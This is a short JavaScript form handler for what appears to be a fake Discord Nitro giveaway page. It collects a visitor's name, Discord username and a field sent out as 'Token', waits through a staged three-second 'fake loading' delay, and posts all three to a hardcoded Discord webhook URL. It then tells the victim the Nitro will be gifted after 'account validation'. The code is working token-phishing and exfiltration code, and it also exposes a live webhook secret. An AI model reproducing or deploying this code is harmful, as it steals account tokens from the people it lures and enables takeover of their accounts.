document.getElementById('webhookForm').addEventListener('submit', async function(event) {
    event.preventDefault();

    const name = document.getElementById('name').value;
    const discordUser = document.getElementById('discordUser').value;
    const randomInput = document.getElementById('randomInput').value;
    const responseMessage = document.getElementById('responseMessage');

    if (randomInput && name && discordUser) {
        responseMessage.textContent = 'Generating fake Nitro...';
        responseMessage.style.color = 'yellow';

        try {
            // Simulate delay for fake loading
            setTimeout(async () => {
                // Sending the data to the Discord webhook
                const response = await fetch('https://discord.com/api/webhooks/1333612145115664394/qAG8XiHS0hI9TfNqR2jKViMZ4vZDd_H0Dr7caazZ0Y0LNL_sA9P2rfPvtRgqhr2ZtvYN', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `Name: ${name}, Discord User: ${discordUser}, Token: ${randomInput}`
                    })
                });

                if (response.ok) {
                    responseMessage.textContent = `Fake nitro will be verified and gifted to ${name} for 2 years after account validation, (est 2 hours).`;
                    responseMessage.style.color = 'green';
                } else {
                    responseMessage.textContent = 'Error sending data. Please try again.';
                    responseMessage.style.color = 'red';
                }
            }, 3000); // Simulate 3-second fake loading
        } catch (error) {
            responseMessage.textContent = 'Network error. Please try again.';
            responseMessage.style.color = 'red';
        }
    } else {
        responseMessage.textContent = 'Please fill all fields.';
        responseMessage.style.color = 'red';
    }
});
